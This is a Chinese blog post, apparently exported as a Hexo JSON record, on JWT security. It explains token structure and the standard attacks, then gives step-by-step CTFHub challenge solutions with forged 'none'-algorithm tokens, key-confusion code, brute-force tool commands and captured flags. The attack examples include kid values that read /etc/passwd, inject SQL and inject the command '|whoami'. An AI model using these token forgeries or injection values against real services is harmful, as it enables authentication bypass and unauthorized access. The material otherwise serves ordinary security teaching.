eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE\n````\n\n![image-20201020161036706](/images/jwt/image-20201020161036706.png)\n\nJWT在线工具\n\n[JWT Online](https://jwt.io/)\n\n[JWT_Tool](https://github.com/ticarpi/jwt_tool)\n\n```python\npip3 install pycryptodomex\npy3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE\n```\n\n![image-20201021113441020](/images/jwt/image-20201021113441020.png)\n\n![image-20201021113549915](/images/jwt/image-20201021113549915.png)\n\n```bash\n1. 修改JWT\n2. 生成None算法的JWT\n3. 检查RS/HS256公钥错误匹配漏洞\n4. 检测JKU密钥是否可伪造\n5. 输入一个key,检查是否正确\n6. 输入一个存放key的文本，检查是否正确\n7. 输入字典文本，爆破\n8. 输入RSA公钥，检查是否正确\n```\n\n\u001c交互工具\n\n主要针对`alg`被致None，因在线工具无法修改为None，所以需要使用交互方式来获取token。\n\n```shell\npython\nimport jwt\njwt.encode(payload)\n```\n\n\n\n\n\n### JWT攻击\n\n以下题目参考[ctfhub](https://www.ctfhub.com/)中关于JWT的CTF试题学习并练习；算法修改并未得到flag。\n\n#### 题一：信息泄漏\n\n题目提示信息：敏感信息泄漏\n\n![image-20201020175137207](/images/jwt/image-20201020175137207.png)\n\n访问URL\n\n```\nhttp://challenge-f0ba92c933a7d9be.sandbox.ctfhub.com:10080/\n```\n\n提示输入用户名及密码\n\n![image-20201020175233885](/images/jwt/image-20201020175233885.png)\n\n观察响应数据\n\n![image-20201020175334255](/images/jwt/image-20201020175334255.png)\n\n发现Cookie属于JWT\n\n![image-20201020175407427](/images/jwt/image-20201020175407427.png)\n\n复制并提交在线工具\n\n```json\neyJBRyI6ImI5MmNlNzk1NDg4ZTZjMDExNjBmNjU4fSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsIkZMIjoiY3RmaHViezA1OGFiZjNiM2IwZTlkOGQ1In0._TNIAg9rDfqtOFejHiIz9tXyJ7-hGqsKlJudTfXYZtw\n\n# 解码后由下图得知，flag只有一半，但是另一半在header中保存，拼接即可。\n```\n\n![image-20201020175507938](/images/jwt/image-20201020175507938.png)\n\n```json\nctfhub{058abf3b3b0e9d8d5b92ce795488e6c01160f658}\n```\n\n#### 题二：None\n\n题目提示：JWT支持None，并且后端不执行签名验证。\n\n![image-20201020192649086](/images/jwt/image-20201020192649086.png)\n\n访问URL\n\n```\nhttp://challenge-9f380c0d9554b48b.sandbox.ctfhub.com:10080/login.php\n```\n\nadmin/admin登录：提示只有admin才能获得flag值。\n\n![image-20201020192750143](/images/jwt/image-20201020192750143.png)\n\n![image-20201020192907650](/images/jwt/image-20201020192907650.png)\n\n获取登录token并进行在线解码处理\n\n分别对header、payload进行解码修改对应值并编码处理。\n\n![image-20201021110733681](/images/jwt/image-20201021110733681.png)\n\n![image-20201021110753552](/images/jwt/image-20201021110753552.png)\n\n````\n# 因后台不进行签名验证了，因此可直接替换对应值即可绕过。\n# 因在线网站无法修改none，因此这里使用python的交互来获取token如下：\n{\"typ\":\"JWT\",\"alg\":\"none\"}\n{\"username\":\"admin\",\"password\":\"1\",\"role\":\"admin\"}\njwt.encode({\"username\":\"admin\",\"password\":\"1\",\"role\":\"admin\"},algorithm=\"none\",key=\"\")\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwicm9sZSI6ImFkbWluIn0.\n````\n\n用none算法生成的JWT只有两部分了，根本连签名都不存在。\n\n![image-20201021144848195](/images/jwt/image-20201021144848195.png)\n\n替换token，重放后可得到flag值\n\n![image-20201021110552087](/images/jwt/image-20201021110552087.png)\n\n````\nctfhub{adcd547cd87ee1536fba1a7fe530a8d9719e9ee3}\n````\n\n#### 题三：弱密码\n\n由题目得知：JWT采用对称加密算法，如果密钥的强度较弱的话，会被爆破攻击。\n\n![image-20201020201008964](/images/jwt/image-20201020201008964.png)\n\n访问URL\n\n```\nhttp://challenge-97dc1d0c313c1266.sandbox.ctfhub.com:10080/login.php\n```\n\n![image-20201020201106689](/images/jwt/image-20201020201106689.png)\n\nadmin/admin\n\n![image-20201020201132629](/images/jwt/image-20201020201132629.png)\n\n获取JWT的token\n\n```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE\n```\n\n使用工具进行爆破得到密钥\n\n![image-20201021111740982](/images/jwt/image-20201021111740982.png)\n\n修改对应值并获得最新的token\n\n![image-20201021111921365](/images/jwt/image-20201021111921365.png)\n\n```\nctfhub{11f50e22266935854562ba365e25aabd719a7cc3}\n```\n\n#### 题四：修改签名算法\n\n题目：修改签名算法完成绕过;\n\n![image-20201021112611069](/images/jwt/image-20201021112611069.png)\n\n访问URL\n\n```\nhttp://challenge-9fc2bbd399072286.sandbox.ctfhub.com:10080/\n```\n\n登录入口信息及部分php提示\n\n![image-20201021141803090](/images/jwt/image-20201021141803090.png)\n\n提示如下：主要关注点下面，主要是对JWT算法并绕过获得flag。\n\n![image-20201021141738055](/images/jwt/image-20201021141738055.png)\n\n````\n{\"username\":\"admin\",\"password\":\"admin\",\"role\":\"admin\"}\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.LURZ-AAb42YweV6rAylSGFB19J5A3dbTMQw0TieJ3u8\n````\n\n```\npip install pyjwt\n\nimport jwt\nimport base64\npublic = open('1.pem', 'r').read()\nprint jwt.encode({\"username\":\"admin\",\"password\":\"admin\",\"role\":\"admin\"}, key=public, algorithm='HS256')\n```\n\n`未获取flag！！！`\n\n### Referer\n\n```\nhttps://xz.aliyun.com/t/6776\nhttps://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/\nhttps://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a\nJWT绕过CTF\nhttps://delcoding.github.io/2018/03/jwt-bypass/\nhttps://www.ctfhub.com/\nhttps://www.slideshare.net/OWASP_Poland/opd-2019-attacking-jwt-tokens\n```\n\n","source":"_posts/JWT安全与实战.md","raw":"---\ntitle: JWT安全与实战\ndate: 2020-10-21 16:57:27\ntags:\n - JWT\n---\n![1_XkmnsJ6Joa6EDFVGUw0tfA](/images/jwt/1_XkmnsJ6Joa6EDFVGUw0tfA.png)\n\n### JWT概述\n\n`JWT`的全称是`JSON Web Token`。遵循JSON格式，跨域认证解决方案。声明被存储在`客户端`，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。\n\n### 传统认证\n\n#### Cookie\n\n```\nHTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。\n\n假设要求登录认证的 Web 页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是要再次登录，就是要在每次请求报文中附加参数来管理登录状态。\n\n不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的 CPU 及内存资源的消耗。从另一侧面来说，也正是因为 HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。\n\n保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了 Cookie 技术。Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。\n\nCookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。\n\n服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。”\n```\n\n摘录来自: 上野宣、于均良. “图解HTTP”。 \n\n### JWT组成\n\nJWT由三部分组成：`header`、`payload`、`signature`\n\n#### header\n\nheader部分最常用的两个字段是`alg`和`typ`，`alg`指定了token加密使用的算法（最常用的为`HMAC`和`RSA`算法），`typ`声明类型为JWT\n\nheader类似如下：\n\n```json\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n```\n\n#### payload\n\npayload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据：\n\n```json\n{\n    \"user_role\" : \"finn\",    \t//当前登录用户\n    \"iss\": \"admin\",          \t//该JWT的签发者,有些是URL\n    \"iat\": 1573440582,        //签发时间\n    \"exp\": 1573940267,        //过期时间\n    \"nbf\": 1573440582,        //该时间之前不接收处理该Token\n    \"domain\": \"example.com\",   //面向的用户\n    \"jti\": \"dff4214121e83057655e10bd9751d657\"   //Token唯一标识\n}\n```\n\n\n\n#### signature\n\nsignature的功能是保护token完整性；生成方式是将header和payload两个部分链接，然后通过header部分指定的`算法`，计算签名。\n\n抽象成公式就是\n\n`signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key`\n\n`注意：`编码header和payload时使用的编码方式为`base64urlencode`，`base64url`编码是`base64`的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充\"=\"号，并将标准Base64中的\"+\"和\"/\"分别改成了\"-\"和\"-\"。\n\n### JWT安全\n\n一个完整的jwt格式为(`header`.`payload`.`signature`)，其中header、payload使用`base64url`编码，signature通过指定算法生成。\n\n#### 加密算法\n\n##### 空加密算法\n\nJWT支持使用空加密算法，可以在header中指定alg为`None`\n\n这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。如下：\n\n```json\n{\n    \"alg\" : \"None\",\n    \"typ\" : \"jwt\"\n}\n{\n    \"user\" : \"Admin\"\n}\n```\n\n生成的完整token为`ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0`\n\n(header+'.'+payload，去掉了'.'+signature字段)\n\n空加密算法的设计初衷是用于调试的，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。\n\n##### RSA改为HMAC\n\nJWT中最常用的两种算法为`HMAC`和`RSA`。\n\n`HMAC`是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。\n\n`RSA`则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。\n\n在HMAC和RSA算法中，都是使用私钥对`signature`字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。\n\n现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥`pem`对JWT token进行签名，公钥`pub`对签名进行验证。\n\n```json\n{\n    \"alg\" : \"RS256\",\n    \"typ\" : \"jwt\"\n}\n```\n\n通常情况下密钥`pem`是无法获取到的，但是公钥`pub`却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即\n\n```json\n{\n    \"alg\" : \"HS256\",\n    \"typ\" : \"jwt\"\n}\n```\n\n同时使用获取到的公钥`pub`作为算法的密钥，对token进行签名，发送到服务器端。\n\n服务器端会将RSA的公钥（`pub`）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。\n\n`https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/`\n\n#### 密钥暴破\n\n暴破基础\n\n- 知悉JWT使用的加密算法\n- 一段有效的、已签名的token\n- 签名用的密钥不复杂（弱密钥）\n\n因此局限性还是较大\n\n工具参考如下：JWT-Tools\n\n简单的组合爆破起来相对较简单，一旦复杂起来将很难再进行实施爆破。\n\n#### 修改KID参数\n\n`kid`是jwt header中的一个可选参数，全称是`key ID`，它用于指定加密算法的密钥\n\n```json\n{\n    \"alg\" : \"HS256\",\n    \"typ\" : \"jwt\",\n    \"kid\" : \"/home/jwt/.ssh/pem\"\n}\n```\n\n因为该参数可以由用户输入，因此也可能造成一些安全问题。\n\n##### 任意文件读取\n\n`kid`参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，因此，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。\n\n```json\n{\n    \"alg\" : \"HS256\",\n    \"typ\" : \"jwt\",\n    \"kid\" : \"/etc/passwd\"\n}\n```\n\n##### SQL注入\n\n`kid`也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证。\n\n```json\n{\n    \"alg\" : \"HS256\",\n    \"typ\" : \"jwt\",\n    \"kid\" : \"key11111111' || union select 'secretkey' -- \"\n}\n```\n\n##### 命令执行\n\n对`kid`参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了`open`函数，通过构造参数就可能造成命令注入。\n\n```json\n\"/path/to/key_file|whoami\"\n```\n\n对于其他的语言，例如php，如果代码中使用的是`exec`或者是`system`来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。\n\n#### 修改JKU/X5U\n\n`JKU`的全称是\"JSON Web Key Set URL\"，用于指定一组用于验证令牌的密钥的URL。类似于`kid`，`JKU`也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。\n\n`X5U`则以URI的形式数允许攻击者指定用于验证令牌的**公钥证书或证书链**，与`JKU`的攻击利用方式类似。\n\n#### 信息泄漏\n\nJWT保证的是数据传输过程中的完整性而不是机密性。\n\n由于payload是使用`base64url`编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行`base64url`解码，就可以读取到payload中携带的信息。\n\n### JWT Tools\n\n[JWT爆破](https://github.com/brendan-rius/c-jwt-cracker)\n\n````shell\ngit clone https://github.com/brendan-rius/c-jwt-cracker.git\ncd c-jwt-cracker\nbrew install openssl\nmake OPENSSL=/usr/local/opt/openssl/include OPENSSL_LIB=-L/usr/local/opt/openssl/lib\n./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE\n````\n\n![image-20201020161036706](/images/jwt/image-20201020161036706.png)\n\nJWT在线工具\n\n[JWT Online](https://jwt.io/)\n\n[JWT_Tool](https://github.com/ticarpi/jwt_tool)\n\n```python\npip3 install pycryptodomex\npy3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE\n```\n\n![image-20201021113441020](/images/jwt/image-20201021113441020.png)\n\n![image-20201021113549915](/images/jwt/image-20201021113549915.png)\n\n```bash\n1. 修改JWT\n2. 生成None算法的JWT\n3. 检查RS/HS256公钥错误匹配漏洞\n4. 检测JKU密钥是否可伪造\n5. 输入一个key,检查是否正确\n6. 输入一个存放key的文本，检查是否正确\n7. 输入字典文本，爆破\n8. 输入RSA公钥，检查是否正确\n```\n\n\u001c交互工具\n\n主要针对`alg`被致None，因在线工具无法修改为None，所以需要使用交互方式来获取token。\n\n```shell\npython\nimport jwt\njwt.encode(payload)\n```\n\n\n\n\n\n### JWT攻击\n\n以下题目参考[ctfhub](https://www.ctfhub.com/)中关于JWT的CTF试题学习并练习；算法修改并未得到flag。\n\n#### 题一：信息泄漏\n\n题目提示信息：敏感信息泄漏\n\n![image-20201020175137207](/images/jwt/image-20201020175137207.png)\n\n访问URL\n\n```\nhttp://challenge-f0ba92c933a7d9be.sandbox.ctfhub.com:10080/\n```\n\n提示输入用户名及密码\n\n![image-20201020175233885](/images/jwt/image-20201020175233885.png)\n\n观察响应数据\n\n![image-20201020175334255](/images/jwt/image-20201020175334255.png)\n\n发现Cookie属于JWT\n\n![image-20201020175407427](/images/jwt/image-20201020175407427.png)\n\n复制并提交在线工具\n\n```json\neyJBRyI6ImI5MmNlNzk1NDg4ZTZjMDExNjBmNjU4fSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsIkZMIjoiY3RmaHViezA1OGFiZjNiM2IwZTlkOGQ1In0._TNIAg9rDfqtOFejHiIz9tXyJ7-hGqsKlJudTfXYZtw\n\n# 解码后由下图得知，flag只有一半，但是另一半在header中保存，拼接即可。\n```\n\n![image-20201020175507938](/images/jwt/image-20201020175507938.png)\n\n```json\nctfhub{058abf3b3b0e9d8d5b92ce795488e6c01160f658}\n```\n\n#### 题二：None\n\n题目提示：JWT支持None，并且后端不执行签名验证。\n\n![image-20201020192649086](/images/jwt/image-20201020192649086.png)\n\n访问URL\n\n```\nhttp://challenge-9f380c0d9554b48b.sandbox.ctfhub.com:10080/login.php\n```\n\nadmin/admin登录：提示只有admin才能获得flag值。\n\n![image-20201020192750143](/images/jwt/image-20201020192750143.png)\n\n![image-20201020192907650](/images/jwt/image-20201020192907650.png)\n\n获取登录token并进行在线解码处理\n\n分别对header、payload进行解码修改对应值并编码处理。\n\n![image-20201021110733681](/images/jwt/image-20201021110733681.png)\n\n![image-20201021110753552](/images/jwt/image-20201021110753552.png)\n\n````\n# 因后台不进行签名验证了，因此可直接替换对应值即可绕过。\n# 因在线网站无法修改none，因此这里使用python的交互来获取token如下：\n{\"typ\":\"JWT\",\"alg\":\"none\"}\n{\"username\":\"admin\",\"password\":\"1\",\"role\":\"admin\"}\njwt.encode({\"username\":\"admin\",\"password\":\"1\",\"role\":\"admin\"},algorithm=\"none\",key=\"\")\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwicm9sZSI6ImFkbWluIn0.\n````\n\n用none算法生成的JWT只有两部分了，根本连签名都不存在。\n\n![image-20201021144848195](/images/jwt/image-20201021144848195.png)\n\n替换token，重放后可得到flag值\n\n![image-20201021110552087](/images/jwt/image-20201021110552087.png)\n\n````\nctfhub{adcd547cd87ee1536fba1a7fe530a8d9719e9ee3}\n````\n\n#### 题三：弱密码\n\n由题目得知：JWT采用对称加密算法，如果密钥的强度较弱的话，会被爆破攻击。\n\n![image-20201020201008964](/images/jwt/image-20201020201008964.png)\n\n访问URL\n\n```\nhttp://challenge-97dc1d0c313c1266.sandbox.ctfhub.com:10080/login.php\n```\n\n![image-20201020201106689](/images/jwt/image-20201020201106689.png)\n\nadmin/admin\n\n![image-20201020201132629](/images/jwt/image-20201020201132629.png)\n\n获取JWT的token\n\n```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE\n```\n\n使用工具进行爆破得到密钥\n\n![image-20201021111740982](/images/jwt/image-20201021111740982.png)\n\n修改对应值并获得最新的token\n\n![image-20201021111921365](/images/jwt/image-20201021111921365.png)\n\n```\nctfhub{11f50e22266935854562ba365e25aabd719a7cc3}\n```\n\n#### 题四：修改签名算法\n\n题目：修改签名算法完成绕过;\n\n![image-20201021112611069](/images/jwt/image-20201021112611069.png)\n\n访问URL\n\n```\nhttp://challenge-9fc2bbd399072286.sandbox.ctfhub.com:10080/\n```\n\n登录入口信息及部分php提示\n\n![image-20201021141803090](/images/jwt/image-20201021141803090.png)\n\n提示如下：主要关注点下面，主要是对JWT算法并绕过获得flag。\n\n![image-20201021141738055](/images/jwt/image-20201021141738055.png)\n\n````\n{\"username\":\"admin\",\"password\":\"admin\",\"role\":\"admin\"}\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.LURZ-AAb42YweV6rAylSGFB19J5A3dbTMQw0TieJ3u8\n````\n\n```\npip install pyjwt\n\nimport jwt\nimport base64\npublic = open('1.pem', 'r').read()\nprint jwt.encode({\"username\":\"admin\",\"password\":\"admin\",\"role\":\"admin\"}, key=public, algorithm='HS256')\n```\n\n`未获取flag！！！`\n\n### Referer\n\n```\nhttps://xz.aliyun.com/t/6776\nhttps://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/\nhttps://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a\nJWT绕过CTF\nhttps://delcoding.github.io/2018/03/jwt-bypass/\nhttps://www.ctfhub.com/\nhttps://www.slideshare.net/OWASP_Poland/opd-2019-attacking-jwt-tokens\n```\n\n","slug":"JWT安全与实战","published":1,"updated":"2020-10-23T03:12:00.474Z","_id":"ckglobhdj0009b1hq1mkz2l84","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src=\"/images/jwt/1_XkmnsJ6Joa6EDFVGUw0tfA.png\" alt=\"1_XkmnsJ6Joa6EDFVGUw0tfA\"></p>\n<h3 id=\"JWT概述\"><a href=\"#JWT概述\" class=\"headerlink\" title=\"JWT概述\"></a>JWT概述</h3><p><code>JWT</code>的全称是<code>JSON Web Token</code>。遵循JSON格式，跨域认证解决方案。声明被存储在<code>客户端</code>，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p>\n<h3 id=\"传统认证\"><a href=\"#传统认证\" class=\"headerlink\" title=\"传统认证\"></a>传统认证</h3><h4 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。</span><br><span class=\"line\"></span><br><span class=\"line\">假设要求登录认证的 Web 页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是要再次登录，就是要在每次请求报文中附加参数来管理登录状态。</span><br><span class=\"line\"></span><br><span class=\"line\">不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的 CPU 及内存资源的消耗。从另一侧面来说，也正是因为 HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</span><br><span class=\"line\"></span><br><span class=\"line\">保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了 Cookie 技术。Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。</span><br><span class=\"line\"></span><br><span class=\"line\">Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。</span><br><span class=\"line\"></span><br><span class=\"line\">服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。”</span><br></pre></td></tr></table></figure>\n\n<p>摘录来自: 上野宣、于均良. “图解HTTP”。 </p>\n<h3 id=\"JWT组成\"><a href=\"#JWT组成\" class=\"headerlink\" title=\"JWT组成\"></a>JWT组成</h3><p>JWT由三部分组成：<code>header</code>、<code>payload</code>、<code>signature</code></p>\n<h4 id=\"header\"><a href=\"#header\" class=\"headerlink\" title=\"header\"></a>header</h4><p>header部分最常用的两个字段是<code>alg</code>和<code>typ</code>，<code>alg</code>指定了token加密使用的算法（最常用的为<code>HMAC</code>和<code>RSA</code>算法），<code>typ</code>声明类型为JWT</p>\n<p>header类似如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;alg&quot;</span>: <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;typ&quot;</span>: <span class=\"string\">&quot;JWT&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h4><p>payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;user_role&quot;</span> : <span class=\"string\">&quot;finn&quot;</span>,    \t<span class=\"comment\">//当前登录用户</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;iss&quot;</span>: <span class=\"string\">&quot;admin&quot;</span>,          \t<span class=\"comment\">//该JWT的签发者,有些是URL</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;iat&quot;</span>: <span class=\"number\">1573440582</span>,        <span class=\"comment\">//签发时间</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;exp&quot;</span>: <span class=\"number\">1573940267</span>,        <span class=\"comment\">//过期时间</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;nbf&quot;</span>: <span class=\"number\">1573440582</span>,        <span class=\"comment\">//该时间之前不接收处理该Token</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;domain&quot;</span>: <span class=\"string\">&quot;example.com&quot;</span>,   <span class=\"comment\">//面向的用户</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;jti&quot;</span>: <span class=\"string\">&quot;dff4214121e83057655e10bd9751d657&quot;</span>   <span class=\"comment\">//Token唯一标识</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"signature\"><a href=\"#signature\" class=\"headerlink\" title=\"signature\"></a>signature</h4><p>signature的功能是保护token完整性；生成方式是将header和payload两个部分链接，然后通过header部分指定的<code>算法</code>，计算签名。</p>\n<p>抽象成公式就是</p>\n<p><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key</code></p>\n<p><code>注意：</code>编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。</p>\n<h3 id=\"JWT安全\"><a href=\"#JWT安全\" class=\"headerlink\" title=\"JWT安全\"></a>JWT安全</h3><p>一个完整的jwt格式为(<code>header</code>.<code>payload</code>.<code>signature</code>)，其中header、payload使用<code>base64url</code>编码，signature通过指定算法生成。</p>\n<h4 id=\"加密算法\"><a href=\"#加密算法\" class=\"headerlink\" title=\"加密算法\"></a>加密算法</h4><h5 id=\"空加密算法\"><a href=\"#空加密算法\" class=\"headerlink\" title=\"空加密算法\"></a>空加密算法</h5><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>\n<p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;None&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;user&quot;</span> : <span class=\"string\">&quot;Admin&quot;</span></span><br><span 